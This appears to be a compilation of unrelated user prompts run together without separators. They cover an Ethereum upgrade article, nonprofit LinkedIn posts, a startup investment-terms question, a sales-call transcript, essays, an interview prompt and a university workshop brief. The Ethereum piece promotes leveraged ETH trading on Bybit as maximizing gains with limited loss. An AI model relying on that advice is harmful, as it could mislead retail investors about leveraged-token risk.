of their portfolio can stay afloat during the crypto bear market. \n\nIn anticipation of this, the Ethereum Foundation has set a hard limit of about 40,000 ETH that can be unlocked each day. This will hopefully ease the selling pressure and reduce short-term ETH volatility.\n\nEthereum Shanghai Network Upgrade Progress\n\nSince testnet Shandong went live in late 2022, plenty of progress for the Ethereum Shanghai network upgrade has been made. These progress updates serve to show that the Ethereum Foundation is on track with its promised March network upgrade rollout.\n\nFirstly, the team managed to copy the blockchain and create a shadow fork to begin the initial stages of testing the new EIPs in an isolated environment. The shadow fork proved a success as it immediately revealed minor glitches with Ethereum nodes that were making use of Geth execution client, the popular node software.\n\nThe latest progress update involves news of the latest Zhejiang testnet being launched. It serves to replace the Shandong testnet. This is because when Shandong was launched, it included several EIPs involving EVM Object Format (EOF) that will not be rolled out with the Shanghai network upgrade due to time and resource constraints. \n\nThus, the newest Zhejiang testnet seeks to allow for staked ETH withdrawal testing in a more accurate environment that places the Ethereum network under a similar load. Ideally, withdrawals for staked ETH should go off without a hitch as they're exposed to simulated network attacks and stress tests. According to Ethereum Foundation developer Parithosh Jayanthi, Zhejiang presents \"a great opportunity for all tools to test out how they want to collect, display and use the withdrawal information.\u201d \n\nThe Zhejiang testnet will be made available on Feb 1, 2023. Following this, the Shanghai+Capella testnet will be triggered six days later at epoch 1350. It's when users will be able to deposit ETH to validators on the testnet, practice Boneh\u2013Lynn\u2013Shacham (BLS) digital signature changes and exit without incurring any risk. On top of this, you'll also be able to convert 0x00 credentials to 0x01 and set a withdrawal address as you test partial and full withdrawals when exiting your validators.\n\nHow to Profit from the Ethereum Shanghai Upgrade\nThinking of how you can profit from the near-term volatility caused by Ethereum's Shanghai upgrade? Here are our thoughts on how you can long ETH in the event that ETH prices soar:\n\nOptimal Bullish Strategy: Stop Market Leveraged Long Order\nFirm believer of our bullish ETH thesis on how more long-term ETH investors might just buy and stake ETH because of the ability to finally withdraw their deposited ETH? Then consider our strategy of utilizing a stop market leveraged long order by buying the leveraged perpetual token ETH3L/USDT on Bybit.\n\nTo do so, simply sign up for a Bybit account before accessing the Spot Trading platform on Bybit and locating the ETH3L token. Once you\u2019re in the trading interface, you\u2019ll need to change your order type to Stop Market. This type of market order essentially helps you extract maximum short-term gains while limiting your maximum loss thanks to the stop-loss in place.\n\nHow to Execute This ETH Trade\nBefore inputting your price levels, it\u2019s key to check for areas of strong buying and selling. You can then place price levels based on perceived support and resistance levels. These can vary based on your personal risk appetite as some price levels appear to be stronger than others.\n\nOnce you\u2019ve funded your Bybit Spot Trading wallet with the necessary funds, you may proceed to input the fields present in your ETH3L leveraged token stop market order and submit the order to place your trade.\n\nTrade Outcomes\nMax profit: Difference between Entry - Exit before rebalancing\n\nMax loss: Difference between Exit - Entry + Volatility Decay + Fees\n\nKeen on reading up more about exact strategies on how you can trade with Spot and Derivative products on Bybit? Check out our guide on how to trade ETH post-merge.\n\nThe Bottom Line\nFor many ETH investors and traders, all eyes will be on its execution as the core developers seek to execute the Ethereum Shanghai upgrade in the smoothest possible manner. While this network upgrade might not be as pivotal as The Merge, it does lay the foundations for future upgrades. \n\nBy changing the way ETH staking works, the Ethereum Shanghai upgrade will impact how retail and institutional investors interact with ETH as they consider staking viable now that withdrawals from the Beacon Chain are possible. This ultimately paints a brighter future for Ethereum as a whole as it continues to prove itself as a viable blue chip crypto project. Who knows; in the long haul, Ethereum might even be able to threaten Bitcoin\u2019s top spot on the market cap list and achieve the Flippening.\nNow that you have read this article, prepare to answer some of my questions.

Maximus UK asked me to pen a piece about the labour market, the opportunities available for people with convictions looking for employment, and how our two organisations work together.\n\nWe work alongside Craig and team delivering their Ministry of Justice UK employment, training & education contracts and Jemma and team delivering their Department for Work and Pensions (DWP) Restart contract.\n\nFor those interested in reading what I've got to say, link in comments.\n\nexample 3: Something very close to my heart and super special to me. The first time I ever really helped someone I didn't know was when working for St Giles as a Peer Mentor. It was where I met a certain Mr Jacob Hill. It was where I began to piece together what a new life could look like, culminating in my joining Offploy.org (where I'm about to hit five years of involvement).\n\nI don't need to preach to anyone about the merits of giving people who have been in contact with the criminal justice system a second chance. Organisations like ours and St Giles have been doing it for yonks.\n\nIt's especially exciting when we see esteemed organisations like The CIPD Trust making giant steps in this space and teaming up with us and St Giles to launch a pilot, supported by the HR and people development profession.\n\nThe pilot has been developed to help people with lived experience of the criminal justice system re-enter the workplace and sustain current roles. Over six months, about 20 mentors and mentees will be matched together and work together to rebuild things such as confidence, skills and help those who have been out of the workplace for some time become comfortable and settled again.\n\nLink in the comments to read more on this.\n\nexample 4: Exciting news - Offploy is partnering with Jobs 22 to provide peer-led employability support to participants of the Restart Scheme with criminal convictions, across East Central England.\n\nOur tailored support, led by mentors with lived experience of the criminal justice system, will help participants overcome the familiar obstacles often experienced by people with criminal convictions attempting to secure employment.\n\nWe're super proud to complement Jobs 22's delivery of the scheme and are excited to help our peers navigate the employment landscape with confidence.\n\nHumongous thanks to Sarah Williams AIEP who has held our hand and helped us to establish the relationship. Link in the comments to a bit more info and a quote from Ayden Sims FIEP and myself.\n\nexample 5: It's the time of year for reflection, to take a step back and work out what has actually gone on. For us at Offploy.org, it's a year where we've had the confidence to lose our own self-imposed label and cast our net wider.\n\nIf we can't shed a label as an organisation, how can we expect the people we support to be able to do the same? We will always celebrate our lived experience of the criminal justice system. Because this gives us our authenticity, our understanding of our peers, our chance for redemption (in our own eyes and society's).\n\nBut we're much more than this. Offending so very often comes at the very end of a well-trodden path, familiar to so many of us working in this space. Remove the \"ex-offender\" label and replace it with a whole host of others.\n\nThis year, we've had the confidence to look further afield. Interrogating our data set has allowed us to look at the amazingly impactful support we have given to our candidates, meeting a multitude of needs.\n\nIn turn, we've decided to not only support people who have reached the end of the line and come into contact with the criminal justice system.\n\nIn practice this means we've delivered services that have focussed on Homelessness, Money Management and Common Mental Health challenges.\n\nWe are so grateful for the support shown in us by our commissioners, who have encouraged us to look at other opportunities to deliver our work. And most importantly, our delivery team led expertly by Joe Prest who have gleefully accepted the challenge.\n\nRoll on 2023."]

In the begining there were 3 co-founders and i payed in october 2022 an amount that was equivalent to 25% of the company. The company is named Celes. Celes is a SaaS B2B that connects to an ERP, analyzes the data and gives recommendations about what to purchases and when, besides, it provides helpful business intelligence reports and customer segmentation. Celes serves companies in the retail sector that benefit from this services as they can have lower stocks and a lower expectation of lost sales. \nThe company has been growing and currently we have 30.000 USD in MRR, an average 1000 USD revenue per client, 12 employees, we pay low salaries compared to the industry and we are not burning money (the incompe received is enough to pay for our current costs of servers, admin and payroll).\nWe are raising money to accelerate our growth and to increase the value provided by our product by hiring more developers, Technical Account Managers and Data Engineers. We expecto to raise $800.000 USD via SAFE from angles and institutional investors with a pre-money cap of $6.0000.000 USD. All this money will be received by a new c-corp company established in Delaware, US.\nWe contacted a company in ireland named Primeline that is a provider to 100% of the biggest retailers in ireland and have a very close relationship with them. They love our product and became a customer of their own.\nPrimeline proposed to invest 300.000 USD via SAFE on the terms that we are raising and were previously exposed. FOr this investment they are asking for a seat in oour board. Apart from that, we are working in a deal where we create a Joint Venture established in ireland called Primalytics. The owners of this Joint Venture will be Primeline (50%) AND Celes Delaware (50%). The purpose of this Joint Venture is to be the official seller of Celes in ireland where Celes Delaware provides the product and everything involved and Primeline will contact its clients so that they purchase Celes services via this JV.\nThe initial proposal was that the 2 companies would split the net revenue of this JV (Revenue after admin and fiscal costs are covered). I think that this deal is advantageous for primeline given that Celes will do all the work and Primeline has nothing to lose from this partnership but the average client in ireland would be at least 4.000 USD, which would provide a nice additional source of revenue for us even when we have to give 50% of the revenue for those deals and also would make the company more valueable given that the product would be proven to work in europe with big brands.\nNow primeline is proposing this:\n\n\"Primeline commits to Investment USD 300k into the Celes Delaware investment company directly. This investment to be returned to the Primalytics JV in Ireland to fund a sales and marketing team focused on growing ARR from EMEA. This represents 5% share in the business and would come with a board seat focused on growing the business.\nWe confirm a vesting vehicle that allows for 50% of the ARR generated out of the Primalytics JV to convert to Equity in Celes based on a 15 times ARR multiple. If Celes is sold for 20 times multiple Primeline\u2019s 50% share of JV sales would convert at 15 times. If Celes is sold at below 15 times then Primeline would match the lower than 15 times multiple for conversion to shares.\nWe believe the focus on selling Celes in Europe and EMEA through the Irish JV will drive significant ARR value quickly.\nWe believe our extensive network into retailers and brands uniquely positions us to drive Celes ARR to USD 1m plus from EMEA.\"\n\nI dont think this is fair because i understand that they will increase the value of their 300kUSD investment inn Celes Delawere when the company sells more and additionally, each dollar sold in Ireland would give them more and more participation in the company. I might be wrong but i think this will give them a double winning while we are the ones doing all the work.\n\nThe co-founder leading the negotiation is proposing this:\n\n\"50% of the revenue from the JV, will be converted to equity at the series A valuation with a 20% discount. That would be like making a SAFE with a cap and discount that is typical from YCombinator\".\n\nI think it might be a sound counter proposal but i am not sure if it would give primeline an over advantageous benefit compared to standard or commom practices in this regard. I would very much like to have the JV with them because it would increase our revenue and the valuation of the company. I think Primeline is fundamental to enter that market. My way to defend this proposal is thinking we will receive capital in the way of the revenue that would otherwise go to Primeline and we will use that money before the series A, so giving additional equity for that money could be fair and the discount will recognize the decrease in value of that money at the time of the series A.\n\nPlease provide a proposal that will make primeline and me very confortable given the context provided.

This chapter will provide you with the foundational knowledge needed to build a strong financial mindset, enabling you to make informed decisions and create lasting wealth. We will discuss the importance of financial education, the difference between assets and liabilities, the role of cash flow in wealth building, and the need for a strong financial mindset.\n\n1.1 The Importance of Financial Education\n\nFinancial education is often overlooked in traditional schooling systems, leaving many individuals unprepared for the complexities of managing their personal finances. This lack of financial knowledge can lead to poor decision-making, mounting debt, and a lack of financial stability. It's essential to prioritize financial education and equip yourself with the knowledge and tools necessary to navigate the world of personal finance effectively.\n\nInvesting in your financial education will help you:\n\nMake better financial decisions\nSet realistic financial goals\nUnderstand and manage risk\nCreate a solid foundation for wealth building\n1.2 Understanding the Difference Between Assets and Liabilities\n\nTo build lasting wealth, it's crucial to understand the difference between assets and liabilities. Assets are things that put money in your pocket, while liabilities are things that take money out of your pocket.\n\nAssets can include:\n\nReal estate investments\nStocks, bonds, and mutual funds\nBusinesses that generate profits\nIntellectual property, such as patents or royalties\nLiabilities can include:\n\nMortgages or other loans\nCredit card debt\nExpenses, such as car payments or utility bills\nBy focusing on acquiring assets and minimizing liabilities, you'll create a solid foundation for wealth building. This shift in mindset and financial behavior is a key differentiator between those who achieve financial freedom and those who struggle financially.\n\n1.3 The Role of Cash Flow in Wealth Building\n\nCash flow is the lifeblood of wealth creation. It refers to the money that flows in and out of your financial accounts, including income, expenses, and investments. Understanding and managing your cash flow is essential to building wealth.\n\nPositive cash flow occurs when you have more money coming in than going out. This surplus can be used to invest in assets, save for emergencies, or reduce debt. On the other hand, negative cash flow happens when your expenses exceed your income, which can lead to financial stress and mounting debt.\n\nTo improve your cash flow and increase your wealth, consider the following strategies:\n\nCreate a budget and track your expenses\nReduce unnecessary spending\nIncrease your income through side hustles or career advancements\nInvest in assets that generate passive income\n1.4 Building a Strong Financial Mindset\n\nA strong financial mindset is the foundation upon which wealth is built. This mindset goes beyond just understanding the basics of personal finance; it's about embracing the attitudes, beliefs, and behaviors that foster financial success.\n\nKey elements of a strong financial mindset include:\n\nA commitment to lifelong financial learning: Continually seeking knowledge about personal finance and investing will empower you to make informed decisions and adapt to changing financial landscapes.\nThe ability to delay gratification: Prioritizing long-term financial goals over short-term pleasures will help you build wealth and achieve financial freedom.\nA focus on abundance rather than scarcity: Adopting an abundance mindset allows you to see opportunities for growth and wealth creation, rather than being limited by a fear of financial failure.\nTaking responsibility for your financial future: Recognizing that your financial success is in your hands, rather than being determined by external factors, will motivate you to take control of your financial destiny.\nBy cultivating a strong financial mindset, you'll be better equipped to navigate the challenges and opportunities that arise in your pursuit of financial freedom.\n\nIn conclusion, understanding the foundation of"]

Obviously, my interest is not to speak like a TV for the next 45 minutes, please be involved. Okay?\n\nSmall Talk\n\nFEDERICO\n\n4:21 Yeah.

We're very proud of that.

Yeah. Okay.\n\nANDREW\n\n4:57 Okay.\n\nFEDERICO\n\n4:57 So, just, we just started recapping very briefly what we've been talking about, Peter. So this is the very first, the very first view of the platform. So you are perfectly on time.\n\nLayout & Content\n\nSILVIA\n\n5:10 All\u2026\n\nPETER\n\n5:11 Right. Good.\n\nSILVIA\n\n5:12 Okay. So Peter, what you're seeing as Nabil, Lisa, Andrew on my screen right now, I'm planning on starting with the learner experience, right? And we said here that we've got so many different people that will be involved in training from blue colors, also employees. We're thinking about different audiences. Some of them might be more technological, some might not the good thing here about that and about Docebo in general. Is that starting from the interface after they log in, the experience is going to be as easy as you want it to be. So, assuming that maybe for blue colors, we would start with this page that you see as being their homepage, what exactly do they need to do?\n\nLayout & Content ends\n\nSILVIA\n\n6:00 They need to follow on onboarding a personalized plan to start with, then step into more soft scales, right? A course catalog where they can explore some courses and go in the direction that you want them to go. This is 100 Nabil.\n\nNABILA\n\n6:17 Yes, I need to know if there is any integration between the performance appraisal results and training, how to integrate\u2026 to plan for the plan for the, and we target to have different quarters training with skills and technical training if needed.\n\nSILVIA\n\n6:46 That is a very good question. Nabilah. So you have all this in Oracle right now? Is that correct?\n\nNABILA\n\n6:55 Yes, we have or this?\n\nSILVIA\n\n7:00 Perfect. So for that part, what we are used to do and we always like to say is that we're obviously not gonna do what Oracle does us.\n\nIntegrations\n\nSILVIA\n\n7:10 So you mentioned very well, they're an integration. So we inherit the information that you're sending us from Oracle for the employee profiles, the everything that has to do with the person's profile, right? If I'm now a solutions consultant, but I'm aiming to become an architect in the future, right?\n\nIntegrations ends\n\nSILVIA\n\n7:33 Same thing applies for you, right? I'm part of GB Auto. I'm having a role right now, but I'm planning on advancing in my career to become more senior. That is something that we do through this integration. First of all, inheriting the roles of the person and then adapting the whole learner experience starting from this very interface. So you would know that myself, Silvia, I'm logging in, I'm GB Auto for the first time, you know, exactly what I need to do, what is going to be needed for me for the next step. Federico might have something completely different as in, he might see the same interface, but a different plan or different catalogues that he can browse through, right?\n\nIntegrations\n\nSILVIA\n\n8:20 So we integrate adapt and provide learning in base of what is arriving from Oracle. Okay. How we're going to integrate? We will be talking about this in maybe a future session. I'd like to concentrate on the platform, right? So what's coming in after this integration? How we can adapt the training to them, right in today session and maybe later on discuss or involve our architects for Andrew as well on this piece of integration because we know that again, we got a full Oracle system.\n\nIntegrations ends\n\nNABILA\n\n8:56 We\u2026\n\nSILVIA\n\n8:56 Got as well. Talent fusion business for HR. So see how we can do that?\n\nNABILA\n\n9:02 Okay. In addition, I need to know is the integration between the management and the finance. I need to know the expenses for each department related to, regarding the training\u2026 I, that regarding\u2026 the department. So I need to know\u2026 the cost of the training and if there is for each employee here, we will attend or not attend this training? I need to know the total cost of the training for each employee. Okay?\n\nSILVIA\n\n9:51 May I ask you?\n\nNABILA\n\n9:52 Yes.\n\nSILVIA\n\n9:55 How, how, where do you have that sitting somewhere else in another?\n\nNABILA\n\n9:59 I think we have an initial\u2026 finance system who the finance team record for each employee by email, whatever integration between the\u2026 academy and the finance team. The all employee who attend the training per month and then record\u2026 the expense or the cost of the training for each employee per.\n\nSILVIA\n\n10:38 Yes. So if I understand what you're asking, I think hearing myself here\u2026 I don't know if it's just me. Okay? Thanks.\n\nPETER\n\n10:49 No, no, there's an equal, ongoing. Yeah, there's an.\n\nSILVIA\n\n10:53 I can hear myself. And then I\u2026\n\nPETER\n\n10:55 And\u2026\n\nSILVIA\n\n10:59 Good. So again, on the training budget side, what we can do from an LMS standpoint, is reflect that budget through additional fields that might come from different systems.\n\nPricing\n\nSILVIA\n\n11:14 As in this training is worth. I don't know, I'm inventing 500 dollars. And then in reporting, you would be able to see who attended the training's name the course that the user is taking plus that additional field with the price or the budget on it that's the maximum we can do from an LMS standpoint, managing budget.\n\nIntegrations\n\nSILVIA\n\n11:39 Obviously, that's why I asked, right? It's something that is coming from another system. It could be an ERP or some place else or even a training management system, right? So we're talking about different systems in here. We could potentially integrate with them as well as export that information and do the ATS in a PowerBI, right?\n\nIntegrations ends\n\nSILVIA\n\n11:58 A business intelligence tool. So it really depends on how we want to move around. This is again, the maximum we can do on that additional field. And I don't know, nail this answers your question or if you need more information on the side?\n\nNABILA\n\n12:13 I think\u2026 if we need to stop the employee for ask for another training. If you check if he has another, the budget for this course or not\u2026 you can have this information.\n\nSILVIA\n\n12:29 We cannot, we\u2026\n\nNABILA\n\n12:31 Cannot\u2026\n\nSILVIA\n\n12:31 Again\u2026 functionalities.\n\nNABILA\n\n12:35 Element\u2026\n\nSILVIA\n\n12:37 More towards the MS. And then again, the would handle.\n\nNABILA\n\n12:40 Would handle this part. I need to ask another question. If the employee asks for a training and then the approval that from his manager, he agree about this training. So it's okay. So you must have the workflow between for the approval, POS between each employee who asks for the training and the high level managerial level of approval.\n\nSILVIA\n\n13:11 Yes.\n\nNABILA\n\n13:12 That is a lot of.\n\nSILVIA\n\n13:14 Yes, absolutely. Yes, that's something that we can do in a sense that trainings into table can be free for users to subscribe, but they can also be moderated.\n\nNotifications\n\nSILVIA\n\n13:23 As in I'm an employee, I request to participate and then somebody else, the manager, the admin, whoever you want that person to be, approves me into training. Now that approval process is not an automated system is just the yes or no, the click of a button. The checks in the back need obviously to be done.\n\nPayment Gateway\n\nSILVIA\n\n13:46 If we're thinking of a workflow, we can potentially do that to use our, we've mentioned it very briefly, probably last time.\n\nNABILA\n\n13:55 Or\u2026\n\nSILVIA\n\n13:55 I pass.\n\nNABILA\n\n13:56 Or\u2026\n\nSILVIA\n\n13:57 So we have a tool that might do you check or create some workflows in the background. It's\u2026\n\nNABILA\n\n14:03 Practice. Okay. Only the integration, I need also to know how to pay for external training for external training, the external training, I pay for it. If we need to have a training from external supplier vendors. So I will pay for it. So.\n\nSILVIA\n\n14:32 You mean?\n\nNABILA\n\n14:34 Maybe internal or external\u2026 for each internal employees, internal Instructor who has the ownership for the lead to the training force\u2026 internal training. Okay. Go ahead.\n\nSILVIA\n\n14:58 Let me see if I got this straight. So, I'm an employee\u2026 there's a thing happening. I request it. Somebody needs to approve me afterwards or you need to create the course after I requested. How would you see this process? Can you describe me a flow? I'm an\u2026\n\nNABILA\n\n15:19 I don't I\u2026 will tell you, I will let you describe the process I need to integrate between the cost of the training course and the finance team who will pay for it after or before attend the training. Do you have any difference between internal and external training in your system?\n\nIntegrations\n\nSILVIA\n\n15:49 Right. We might have different concepts of external training. And this is what I'm trying to clarify here in the sense that in Docebo, we are content agnostic, you can bring in content from different sources. You can organize glass room sessions, you can bring LinkedIn learning or whichever other provider as well as adding your materials, which was what I was planning to show you today and that is happy opening within LMS.\n\nIntegrations ends\n\nSILVIA\n\n16:23 That is our concept of external training content that's coming from the outside of the platform. You bring it in and organize it in the way that you want in your understanding. If I am interpreting this correctly, is what you're looking for is training that is happening outside of the platform. I don't know in the classroom with a trainer or something that the users see some place else that's not in the LMS. Is that correct?\n\nPETER\n\n16:51 See, let me jump in.\n\nNABILA\n\n16:53 Jump in.\n\nPETER\n\n16:54 Let me jump in here in.\n\nNABILA\n\n16:57 Okay.\n\nPETER\n\n16:57 Now, I hear the echo here as well. Is the\u2026\n\nFEDERICO\n\n17:03 Yeah, it happens only when Nabil has got a micro.\n\nANDREW\n\n17:07 Okay. So.\n\nPETER\n\n17:08 Nabil, you obviously have to sources that are connected.\n\nFEDERICO\n\n17:11 No, it's okay. Because she's muted.\n\nPETER\n\n17:15 All right. Okay. This discussion about budget and prices has nothing to do on the cover of an LMS\u2026 in general. If I want to roll out as an employee of a, I can apply. And then as you described, it has to be approved by the manager or by the business unit that they have to be aware of the budget that is allocated for that training\u2026 over the year. And they can say, yes, this specific person should take the training and they can improve by click as you described."]

Depression can affect anyone regardless of gender, age, or other demographic factors. Women face a higher prevalence of depression than men. However, men and the elderly can face unique cultural and social factors that may contribute to the under-diagnosis and under-treatment of depression. For example, men may feel societal pressure to appear strong and not seek help for mental health issues, while the elderly may face isolation and loneliness, which can increase their risk for depression. In addition, there is a lack of awareness among the general public about the symptoms of depression, which can lead to individuals not recognizing that they have a problem in the first place.\n\nTo address this issue, primary care centers can play a crucial role in identifying and treating depression. These centers can provide routine screening for depression and offer referrals to specialized care when necessary. Moreover, empowering these centers with digital therapeutics, such as online counseling and treatment services, can increase access to care and improve outcomes for patients.\n\nBy making depression screening a routine part of primary care services and offering digital therapeutics as a treatment option, we can help bridge the gap in mental health care in India. This approach will not only benefit those who are currently suffering from depression but also promote a wider understanding and acceptance of mental health issues in India.\n\nWe must work towards creating a society where mental health is prioritized and where everyone has access to the care and support they need to live healthy, fulfilling lives.\""]

No need to be fancy, keep it as simple as possible.\n\nThe setup\n\n- You are the PM of the ETA team at Uber.\n - ETA is estimated time of arrival \u2014 the number that says how far your car is\n - ETA important because not only does it tell the customer how far the car is, but it is an input into all kinds of pricing / supply planning things. So if it goes down or has issues, it\u2019s a big deal.\n - The ETA score is generated by a service which you are the PM of. You do normal stuff like try to make it better over time and ensure it\u2019s not broken.\n- One day the customer success team comes to you\n - They say, \u201chey we just realized we never told you about this data set that we have\u201d\n - The data set is a log of all complaints submitted by users to Uber \\*\\*\\*\\*through the app.\n - E.g. \u201cdriver was rude\u201d, \u201ccar didn\u2019t show up\u201d, \u201ci got charged twice\u201d\n - Each complaint is one row in the data set.\n - Each complaint is tagged with a category. e.g. `driver related`, `price related`, `ETA related`\n \n \n \ud83d\udccc For the candidate to discover through questions:\n \n - The data is always up to date in real-time (keeping it simple)\n - There is no open text field.

Despite the wide variety of metamaterial configurations proposed so far, most of the existing solutions display a frequency response that cannot be tuned, once the structures are fabricated. Few exceptions include systems controlled by electric or magnetic fields, temperature, radio waves and mechanical stimuli, which may often be unpractical for real-world implementations. To overcome this limitation, we introduce here a polymeric 3D-printed elastic metamaterial whose transmission spectrum can be deterministically tuned by a light field. We demonstrate the reversible doubling of the width of an existing frequency band gap upon selective laser illumination. This feature is exploited to provide an elastic-switch functionality with a one-minute lag time, over one hundred cycles. In perspective, light-responsive components can bring substantial improvements to active devices for elastic wave control, such as beam-splitters, switches and filters."]

The person on the receiving end interprets the phrase as \u201cblack lives matter more than any other lives.\u201d\n\nBut the point of Black Lives Matter isn't to suggest that black lives should be or are more important than all other lives. Instead, it\u2019s simply pointing out that black people's lives are relatively undervalued in the US \u2014 and more likely to be ended by police \u2014 and the country needs to recognize that inequity to bring an end to it.\n\nTo this end, a better way to understand Black Lives Matter is by looking at its driving phrase as \u201cblack lives matter, too.\u201d So all lives do matter, obviously, but it\u2019s one subset of lives in particular that\u2019s currently undervalued in America.\nBut if that isn\u2019t good enough, here are nine other ways the response \u201call lives matter\u201d has been rebuked.\n\n1) \u201cAll houses matter\u201d\n\"All lives matter\" is wrong.\nKris Straub/Chainsawsuit\n2) A Reddit user\u2019s explanation\n\n3) \u201cAll plates matter\u201d\n\n4) \u201cThere are other diseases too\u201d\nDo people who change #BlackLivesMatter to #AllLivesMatter run thru a cancer fundraiser going \"THERE ARE OTHER DISEASES TOO\"\n\n\u2014 Arthur Chu (@arthur\\_affect) November 27, 2014\n5) \u201cI too have felt loss\u201d\nWTF is the impulse behind changing #BlackLivesMatter to #AllLivesMatter. Do you crash strangers' funerals shouting I TOO HAVE FELT LOSS\n\n\u2014 Arthur Chu (@arthur\\_affect) November 27, 2014\n6) A Unitarian Universalist minister\u2019s explanation to a church member\nTaken from the Unitarian Universalist Association's website:\n\nOf course all lives matter. Central to Unitarian Universalism is the affirmation of the inherent worth and dignity of every person. Sadly, our society has a long history of treating some people as less valuable than others. Study after study has confirmed that in equivalent situations, African Americans and Latinos are treated with deadly force far more often than White people, and authorities held less accountable. Unfortunately, racial bias continues to exist even when it is no longer conscious\u2014this too is confirmed by multiple studies. A lack of accountability in the use of force combined with unconscious bias is too often a deadly combination \u2013 and one that could place police officers, as well as the public, in great danger.\n\nTo say that Black lives matter is not to say that other lives do not; indeed, it is quite the reverse\u2014it is to recognize that all lives do matter, and to acknowledge that African Americans are often targeted unfairly (witness the number of African Americans accosted daily for no reason other than walking through a White neighborhood\u2014including some, like young Trayvon Martin, who lost their lives) and that our society is not yet so advanced as to have become truly color blind. This means that many people of goodwill face the hard task of recognizing that these societal ills continue to exist, and that White privilege continues to exist, even though we wish it didn\u2019t and would not have asked for it. I certainly agree that no loving God would judge anyone by skin color.\n\nAs a White man, I have never been followed by security in a department store, or been stopped by police for driving through a neighborhood in which I didn\u2019t live. My African American friends have, almost to a person, had these experiences. Some have been through incidents that were far worse. I owe it to the ideal that we share, the ideal that all lives matter, to take their experiences seriously and listen to what they are saying. To deny the truth of these experiences because they make me uncomfortable would be to place my comfort above the safety of others, and I cannot do that.\n\nI very much appreciate you writing to me, and am glad that we share the goal of coming to a day when people will not be judged, consciously or unconsciously, on the basis of their race. I believe that day is possible, too, but that it will take a great deal of work to get there. That work begins by listening to one another, and listening especially to the voices of those who have the least power in society. If nothing else is clear from the past few weeks, it is painfully evident that a great many people do not believe that they are treated fairly. Healing begins by listening to those voices and stories.\n\n7) A simple video explainer\n\n8) A law professor\u2019s response to a student\nTaken from the law professor\u2019s much longer letter to the student:\n\nA law professor explains why Black Lives Matter is not exclusionary.\nImgur\n9) \u201cIf all lives matter \u2026 prove it!\u201d"]

We use other vendors so kind of the business has no scouts will point but maybe a spreadsheet isn't quite good enough and so there needs to be some you know more robust central record or repository of all these different kind of projects that we run for clients.

I want it to not only reduce costs of producing machines like it, but also allow for hobbyists and hackers and makers to design improvements to it. I would like it to be similar to the advent of compilers and text editors, in that talented people could use the tool to make the next version of the tool, allowing for fast improvement. In this case, though, it is a physical thing, although it would likely be computer powered. I do not think 3d printers meet this goal because the parts they make have a low ratio of cost to strength/rigidity. I have considered CNC routers that cut and shape plywood, which could have all their structural parts made by an identical machine. Ideally it might be a pair of robot arms (patterned off of human arms, so it is more trainable by humans), but that seems a bit harder to achieve.\nAre there any thoughts you have on this? Do you have any other suggestions? Basically, yes, I'm after robots building robots, very possibly using AI such as that produced by your company. Do you see this happening?"]

I especially like this: \"Although 3D printers might not produce the strongest parts, they can still create functional components that can be used in the assembly of a fabrication machine\". I have a thought along that line, where the 3d printer would produce things that have similar purpose to concrete forms, where they establish the geometry and hold a liquid or slurry in place until it hardens. I think it could be combined with rectangular cross section dimensional lumber (or even very small wood parts, such as \"popsicle sticks\"), themselves cut to length (with angled cuts) which eventually can be cut but a machine fabricated with this technology. One advantage is that you could design the parts in a very simple to use 3d modeling program that just connects points together (stick and joint style), and even if the joints are at odd angles, it can quickly use a bit of AI to determine how to cut the boards, and the shape of the joints that will be 3d printed. I'd imagine that you could assemble your parts (which are held together by 3d printed joints that are 95% air), and then inject a semi-liquid, which could be plaster of paris, hot glue, epoxy, polyester resin, portland cement, or even just elmers glue for small parts. The joints might have solid surfaces, but be mostly hollow but with a mesh within them. The 3d printed plastic is not removed, even though it contributes little to the structure compared to the hardened semi-liquid. What do you think?"]

Your tutor will observe your participation for you to be eligible to receive a mark for this workshop. The active participation include (but not limit to) present your solutions, help your teammates, and actively engage with the team. Attending the workshop with only passive participation will not be given a mark. See the Workshop Overview under Subject Information on the LMS for more details.\n Requisite Knowledge and Tools\nTo complete this workshop you will need to be familiar with the following terms and concepts:\n\u2022 Use cases and use case diagrams\n\u2022 Domain models and system sequence diagrams \u2022 The representational gap\n\u2022 Object Oriented Programming in Java\nIntroduction\nThis week workshop will move focus to the solution space and static and dynamic design modelling. We will be considering the relationship of the design models to the domain model and system sequence diagrams and the representational gap between the static models. We will also look at the transformation of the design models into Java code. Once again we will be using Draw.IO as our supported diagramming tool.\nWe suggest you use the textbook and resources provided in the \"Pre-Workshop Learning\" sub-module which include UML notation references for Design Class Diagram and Design Sequence Diagram.\n1\nPart 1 From Domain to Design Class Diagrams\ni\nHaving now generated a Domain Model for a subset of our new student learning management system, lets look at the work involved in deriving a Design Model from this Domain Model. Focusing on the Upload an Assignment Submission use case from the previous workshop, create a Design Model that specifies the software classes required for this functionality. You may abstract concepts such as Databases to a higher level. Assume the implementation is in Java.\nAfter completing version 1 of your Static Design Model, answer the following questions:\n1. When deriving our Design Model from the Domain Model (and other constraints) it is common that we try to minimise the Representational Gap. That is, we translate a domain class Exam to a design class Exam. We could have easily called the design class BaseBallGlove or AhKisuLwjMMn but we don\u2019t. What advantages does this give?\n2. What kind of assumptions did you need to make about the design to construct the Design Model from the Domain Model? Where would you normally get this kind of data?\nPart 2 Creating a Dynamic Design Model\nStarting from the Submission System Sequence Diagram, draw a Submission design sequence diagram. Ensure that your system sequence diagram, your design class diagram, and your design sequence diagram are consistent; you may need to iterate a few times making changes to achieve this.\nAfter completing version 1 of your Dynamic Design Model, answer the following questions:\n1. What does the dynamic model tell us about the static model?\n2. Would it have been better to start with the dynamic model and use it to inform construction of the static model?\n Note: Alltasksshouldbedoneasateamanddemonstrateactiveparticipation.\n2\n\nPart 3 From Design to Implementation\ni\nThe final step after you have finished your static modelling is to move to actual implementation. Often it is the case that developers will focus on Static models (including domain and design class diagrams), along with use cases, to specify how software is to be written. Figures 1 and 2 specify the domain and class diagrams for a basic program that validates student submissions to our new LMS system. The interface required have been provided in the workshop package for you, along with a sample mock implementation.\nFigure 1: Incomplete Domain Model for Submission Validation\n Codingcollaboration: Teamsmustsharethecodingfortheirprojects.Youshouldusethisexercise to practice dividing up the coding work in an effective way.\n 3\n\n Figure 2: Incomplete Design Model for Submission Validation\nBased on this information alone, create a Java implementation of the Design Model in Eclipse, along with a driver program to test your program. Once you have completed this, answer the following questions.\n1. Did you have sufficient information to complete the implementation?\n2. What assumptions, if any, did you have to make about certain functions or relationships within the program?\n3. Does your program work the same as people\u2019s sitting near to you? If not, how does it differ?\n\nI'm the tutor, write me the tutorial script for this"]

